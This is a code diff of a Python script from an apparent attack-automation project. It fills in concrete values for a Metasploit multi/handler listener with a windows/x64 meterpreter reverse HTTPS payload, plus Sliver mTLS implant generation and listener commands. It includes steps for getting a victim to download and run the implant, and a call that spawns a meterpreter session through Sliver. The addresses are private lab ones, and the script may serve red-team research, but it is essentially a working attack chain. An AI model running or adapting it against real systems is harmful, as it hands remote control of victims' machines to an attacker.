@@ -1,50 +1,58 @@
-from attack_executor.config import load_config
-
-config = load_config(config_file_path="/home/user/attack_executor/test/config.ini")
-
-# from attack_executor.exploit.Metasploit import MetasploitExecutor
-# metasploit_executor = MetasploitExecutor(config)
-# metasploit_executor.exploit_and_execute_payload(
-#                             target = None,
-#                             exploit_module_name = "exploit/multi/handler",
-#                             payload_module_name = "#{payload_name}"",
-#                             listening_host = "#{LHOST}",
-#                             listening_port = "#{LPORT}"):
+import asyncio
 
 
-"""
-Executor:
-Sliver Console
-Command:
-sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
-sliver > mlts --lport #{LPORT}
+async def main():
+    from attack_executor.config import load_config
 
-"""
+    config = load_config(config_file_path="/home/user/attack_executor/test/config.ini")
 
-"""
-Executor:
-Human
-Command:
-(This step needs human interaction and (temporarily) cannot be executed automatically)
-(On attacker's machine)
-python -m http.server
+    from attack_executor.exploit.Metasploit import MetasploitExecutor
+    metasploit_executor = MetasploitExecutor(config = config)
+    metasploit_executor.exploit_and_execute_payload(
+                                target = None,
+                                exploit_module_name = "exploit/multi/handler",
+                                payload_module_name = "windows/x64/meterpreter_reverse_https",
+                                listening_host = "192.168.56.39",
+                                listening_port = "8443")
 
-(On victim's machine)
-1. Open #{LHOST}:#{LPORT} in the browser
-2. Navigate to the path of the target payload file
-3. Download the payload file
-4. Executet the payload file to #{PATH}
+    """
+    Executor:
+    Sliver Console
+    Command:
+    sliver > generate --mtls 192.168.56.39:9001 --os windows --arch 64bit --format exe --save /home/user/Downloads
+    sliver > mtls --lport 9001
 
-"""
+    """
 
-"""
-Executor:
-None
-Command:
-None
+    """
+    Executor:
+    Human
+    Command:
+    (This step needs human interaction and (temporarily) cannot be executed automatically)
+    (On attacker's machine)
+    python -m http.server
 
-"""
+    (On victim's machine)
+    1. Open #{LHOST}:#{LPORT} in the browser
+    2. Navigate to the path of the target payload file
+    3. Download the payload file
+    4. Executet the payload file to #{PATH}
 
-from attack_executor.post_exploit.Sliver import SliverExecutor
-sliver_executor = SliverExecutor(config = config)
-# sliver_executor.msf(#{SessionID}, \#{Payload}, \#{LHOST}, \#{LPORT})
+    """
+
+    """
+    Executor:
+    None
+    Command:
+    None
+
+    """
+
+    from attack_executor.post_exploit.Sliver import SliverExecutor
+    sliver_executor = SliverExecutor(config = config)
+    # # await sliver_executor.client.connect()
+    await sliver_executor.msf("508994c3-81fe-4ce0-a8b0-fa9561dcca9d", "meterpreter_reverse_https", "192.168.56.39", 8443)
+
+
+if __name__ == '__main__':
+    asyncio.run(main())
